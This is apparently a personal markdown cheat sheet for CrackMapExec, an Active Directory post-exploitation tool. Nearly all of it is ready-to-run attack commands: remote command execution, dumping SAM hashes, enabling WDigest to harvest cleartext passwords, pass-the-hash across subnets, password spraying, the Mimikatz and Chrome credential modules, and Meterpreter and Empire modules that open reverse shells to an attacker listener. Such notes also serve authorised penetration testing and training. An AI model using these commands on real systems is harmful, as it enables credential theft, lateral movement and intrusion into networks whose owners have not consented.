# know how crackmapexec

[Download](https://github.com/Porchetta-Industries/CrackMapExec)

[Cheat sheet](https://www.ivoidwarranties.tech/posts/pentesting-tuts/cme/crackmapexec-cheatsheet/)

"CrackMapExec (a.k.a CME) is a post-exploitation tool that helps automate assessing the security of large Active Directory networks. Built with stealth in mind, CME follows the concept of ""Living off the Land"": abusing built-in Active Directory features/protocols to achieve it's functionality and allowing it to evade most endpoint protection/IDS/IPS solutions.
CME makes heavy use of the Impacket library for working with network protocols and performing a variety of post-exploitation techniques.
Although meant to be used primarily for offensive purposes (e.g. red teams, internal pentest), CME can be used by blue teams as well to assess account privileges, find possible misconfigurations and simulate attack scenarios."

```bash
crackmapexec 192.168.10.0/24

## command execution
crackmapexec 192.168.10.11 -u Administrator -p 'P@ssw0rd' -x whoami

crackmapexec 192.168.10.11 -u Administrator -p 'P@ssw0rd' -X '$PSVersionTable'

## Checked for logged in users

crackmapexec 192.168.215.104 -u 'Administrator' -p 'PASS' --lusers

## Using Local Auth Allows you to use local accounts rather than domain creds.

crackmapexec 192.168.215.138 -u 'Administrator' -p 'PASSWORD' --local-auth

## Enumerating Shares This allows us to re-enable the WDigest provider and dump clear-text credentials from LSA memory

crackmapexec 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth --wdigest enable
crackmapexec 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth --wdigest disable

## Password Policy One useful query enumerates the domain’s password policy including complexity requirements
crackmapexec 192.168.215.104 -u 'Administrator' -p 'PASS' --pass-pol

## RID Bruteforcing you can use the rid-brute option to enumerate all AD objects including users and groups by guessing every resource identifier (RID), which is the ending set of digits to a security identifier (SID). 

crackmapexec 192.168.215.104 -u 'Administrator' -p 'PASS' --rid-brute

## Dumping the local SAM hashes

crackmapexec 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth --sam

## Passing-the-Hash against subnet Login to all subnet machines via smb with admin + hash. By using the –local-auth and a found local admin password this can be used to login to a whole subnets smb enabled machines with that local admin pass/hash.

cme smb 172.16.157.0/24 -u administrator -H 'aad3b435b51404eeaa35b51404ee:5509de4fa6e8d9f4a61100e51' --local-auth

## NULL Sessions You can log in with a null session by using '' as the username and/or password

crackmapexec smb <target(s)> -u '' -p ''

## Brute Forcing & Password Spraying We can do this by pointing crackmapexec at the subnet and passing the creds:

crackmapexec 10.0.2.0/24 -u ‘admin’ -p ‘P@ssw0rd’

## Bruteforcing examples

crackmapexec <protocol> <target(s)> -u username1 -p password1 password2

crackmapexec <protocol> <target(s)> -u username1 username2 -p password1

crackmapexec <protocol> <target(s)> -u ~/file_containing_usernames -p ~/file_containing_passwords

crackmapexec <protocol> <target(s)> -u ~/file_containing_usernames -H ~/file_containing_ntlm_hashes

## Listing Modules

crackmapexec -L

## SMB Mimikatz module

sudo cme 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth -M mimikatz

## Modules - Enum_Chrome
sudo cme 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth -M enum_chrome

## Modules - Enum_AV Another piece of useful information CrackMapExec can gather is what anti-virus software is in use.

sudo cme 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth -m enum_avproducts

## Getting Shells with CrackMapExec in metasploit Need to setup Http Reverse Handler in MsfConsole

sudo cme 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth -M met_inject -o LHOST=192.168.215.109 LPORT=5656 

## Getting Shells with CrackMapExec in Empire

### Start RESTful API

empire --rest --user empireadmin --pass gH25Iv1K68@^

### Launch empire listener to target

sudo cme 192.168.215.104 -u Administrator -p PASSWORD --local-auth -M empire_exec -o LISTENER=CMETest
EMPIRE_EXEC  
```
